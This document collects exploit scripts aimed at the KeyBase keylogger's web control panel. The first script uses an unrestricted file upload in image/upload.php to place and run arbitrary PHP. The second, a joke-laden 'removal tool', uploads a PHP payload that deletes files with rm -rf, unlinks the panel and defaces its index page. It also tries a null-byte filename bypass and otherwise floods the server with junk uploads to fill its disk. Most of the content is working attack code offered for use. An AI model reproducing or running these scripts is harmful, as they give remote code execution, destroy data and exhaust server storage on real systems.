


Type: Upload vulnerability

Author: [Unit42](http://researchcenter.paloaltonetworks.com/2015/06/keybase-keylogger-malware-family-exposed/)


```
import requests
import sys

if len(sys.argv) != 2:
	print "Usage: %s [php_file]" % __file__
	sys.exit(1)

URL = ""
print "Sending request..."

multiple_files = [('file', ('WIN-JJFOIJGL_6_5_14_22_2.php', open(sys.argv[1], 'rb')))]

r = requests.post(URL + "image/upload.php", files=multiple_files)
print "Results:"
print

r = requests.get(URL + "image/Images/WIN-JJFOIJGL_6_5_14_22_2.php")
print r.text
```


Type: Permissions


```
Anyone can browe /image/Images (screenshots of victims computers)
```


Type: Removal Tool (keybase_WAR.py)

Author: [Unknown](https://www.snip2code.com/Snippet/1098092/skidEATH)


```
import requests, sys, time, os, random

# -7- NuK KEYBASE NUCLEAR WINTER
print "\n[WK SILOS OPENED]"
print "\n*RADIO* Target acquired -", sys.argv[1]
time.sleep(1)
print "\n[PREPARING NUCLEAR MISSILE]"
fusionCORE = """
<?php
	exec('rm -rf ../../assets');
	exec('rd /s /q ../../assets');
	unlink('../../clipboard.php');
	unlink('../../config.php');
	unlink('../../create.php');
	unlink('../../index.php');
	unlink('../../keystrokes.php');
	unlink('../../login.php');
	unlink('../../notifications.php');
	unlink('../../passwords.php');
	unlink('../../post.php');
	unlink('../../screenshots.php');
	$file = '../../index.html';
	$data = '<html><body background="http://i.imgur.com/sm5hLyI.jpg"><center><font color="#40FF00"><h1>P<font color="#FFFFFF">33</font>ka-B00 3y3 <font color="#FFFFFF">w</font>R3k7 u<font color="#FFFFFF">!</font>+!</h1><br><img src="http://i.imgur.com/QNcgLku.gif" alt="b00m"><br><br><font size="3">x0FF-DA-L4WN-KREW</font><br><br><img src="http://i.imgur.com/NqMI9wf.gif"><br><font size="1" color="blue">greetz u lusty #nuclear #winter</font><br></body></html>';
	file_put_contents($file,$data);
	exec('rm -rf ../../image');
	exec('rd /s /q ../../image');
	array_map('unlink', glob("*"));
	array_map('unlink', glob("thumbs/*"));
	unlink('../upload.php');
?>
"""
with open("warhead.php", "wb") as warhead:
	warhead.write(fusionCORE)
files = [("file", ("warhead.php", open("warhead.php", "rb")))]
stealthTECH = {"User-Agent": "Totally not korea"}
lipstick_of_death = requests.post(sys.argv[1] + "image/upload.php", files=files, headers=stealthTECH)
if "Error" in lipstick_of_death.text and lipstick_of_death.status_code == 200:
	print "\n\t**WARNING** Missile defenses detected! **WARNING**\n"
	orders = raw_input("*RADIO* Attempt orbital laser bombardment? - [D]estroy: ")
	if orders == "D" or orders == "d" or orders == "destroy":
		time.sleep(1)
		print "\n*RADIO* Roger that! Preparing secondary strike!"
		time.sleep(1)
		files = [("file", ("warhead.php\x00LAZER.png", open("warhead.php", "rb")))]
		fire_lazer = requests.post(sys.argv[1] + "image/upload.php", files=files, headers=stealthTECH)
		if "Error" in fire_lazer and fire_lazer.status_code == 200:
			print "\n\t**WARNING** Anti-laser refractor scramblers deployed! **WARNING**"
			time.sleep(1)
			orders = raw_input("\n*RADIO* WMD's are no longer an option! Should we flood them with propaganda or deploy the freedom Jihadis? - [F]lood [J]ihadi: ")
			if orders == "F" or orders == "f" or orders == "flood":
				print "\n[PLANES PERFORMING FLY OVER]\n"
				peeweeganda = requests.get("http://i.imgur.com/jXnKO.jpg")
				if peeweeganda.status_code == 200:
					pwg = open("peeweeGANDA.jpg", "wb")
					pwg.write(peeweeganda.content)
					pwg.close()
				flyers = 1
				try:
					while True:
        	                		files = [("file", ("MISLCMD-" + str(random.randint(1,666)) + "_04_20_79_" + str(flyers) + "_1.jpg", open("peeweeGANDA.jpg", "rb")))]
			                        drop_flyers = requests.post(sys.argv[1] + "image/upload.php", files=files, headers=stealthTECH)
                			        print "\tDropped", str(flyers), "flyers!"
                			        flyers += 1
				except:
					print "\n*RADIO* Attack forces standing down...\n"
					sys.exit(1)
			elif orders == "J" or orders == "j" or orders == "jihadi":
				print "\n[PREPARING EXPLOSIVE SATCHELS]\n"
				with open("jihadi.png", "wb") as jihadi:
					jihadi.write(os.urandom(5482048))
				jihadist = 1
				try:
					while True:
						files = [("file", ("MISLCMD-" + str(random.randint(1,666)) + "_04_20_79_" + str(jihadist) + "_1.png", open("jihadi.png", "rb")))]
						deploy_jihadist = requests.post(sys.argv[1] + "image/upload.php", files=files, headers=stealthTECH)
						print "\tJihadist", str(jihadist), "detonated! Direct hit -", str((jihadist * 5)) + "MB Destroyed!"
						jihadist += 1
				except:
					print "\n*RADIO* Attack forces standing down...\n"
					sys.exit(1)
			else:
				print "\n*RADIO* Attack forces standing down...\n"
				sys.exit(1)
	else:
		print "\n*RADIO* Attack forces standing down...\n"
		sys.exit(1)
elif "404" in lipstick_of_death.text or lipstick_of_death.status_code == 404:
	print "\n*RADIO* Halting attack, sir! Are the coordinates accurate?!\n"
	sys.exit(1)
elif "403" in lipstick_of_death.text or lipstick_of_death.status_code == 403:
	print "\n*RADIO* Something is wrong! ABORT!\n"
	sys.exit(1)
else:
	print "\n[LAUNCHING NUCLEAR MISSILE]\n"
	time.sleep(1)
	print lipstick_of_death
	time.sleep(1)
	print "\n[MISSILE COMMAND CENTER]\n\nDETONATION IN T-MINUS\n"
	time.sleep(1)
	print "3\n"
	time.sleep(1)
	print "2\n"
	time.sleep(1)
	kiss_of_death = requests.get(sys.argv[1] + "image/Images/warhead.php", headers=stealthTECH)
	print "1\n"
	time.sleep(1)
	print """
		            _____
                     __,-~~/~    `---.
                   _/_,---(      ,    )
               __ /        <    /   )  \___
- ------===;;;'====------------------===;;;===----- -  -
                  \/  ~"~"~"~"~"~\~"~)~"/
                  (_ (   \  (     >    \)
                   \_( _ <         >_>'
                      ~ `-i' ::>|--"
                          I;|.|.|
                         <|i::|i|`.
                        (` ^'"`-' ")
	"""
	time.sleep(1)
	print "\n*RADIO* This battle is won...but the war is far from over!"
	print "\n*RADIO* Over and OUT\n"
```
